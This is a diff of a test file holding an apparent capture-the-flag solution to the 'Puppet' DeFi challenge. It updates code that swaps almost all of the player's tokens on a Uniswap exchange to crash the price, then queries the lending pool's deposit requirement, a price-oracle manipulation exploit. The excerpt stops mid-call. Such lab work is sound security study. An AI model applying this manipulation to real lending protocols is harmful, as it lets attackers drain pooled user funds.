@@ -114,21 +114,21 @@ describe("[Challenge] Puppet", function () {
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
     // connecting attacker to contracts
-    const attackToken = this.token.connect(attacker);
-    const attackUniswapExchange = this.uniswapExchange.connect(attacker);
-    const attackLendingPool = this.lendingPool.connect(attacker);
+    const attackToken = token.connect(player);
+    const attackUniswapExchange = uniswapExchange.connect(player);
+    const attackLendingPool = lendingPool.connect(player);
     // approve token spending here
     await attackToken.approve(
-      this.uniswapExchange.address,
-      ATTACKER_INITIAL_TOKEN_BALANCE
+      uniswapExchange.address,
+      PLAYER_INITIAL_TOKEN_BALANCE
     );
     // swapping all tokens for ETH to manipulate price
     await attackUniswapExchange.tokenToEthSwapInput(
-      ATTACKER_INITIAL_TOKEN_BALANCE.sub("1"), // to satisfy condition
+      PLAYER_INITIAL_TOKEN_BALANCE - 1n, // to satisfy condition //FIX HERE
       1, // any ETH to get back is ok
       9999999999 // any deadline will do
     );
-    const deposit = await this.lendingPool.calculateDepositRequired(
+    const deposit = await lendingPool.calculateDepositRequired(
       POOL_INITIAL_TOKEN_BALANCE
     );
     console.log(
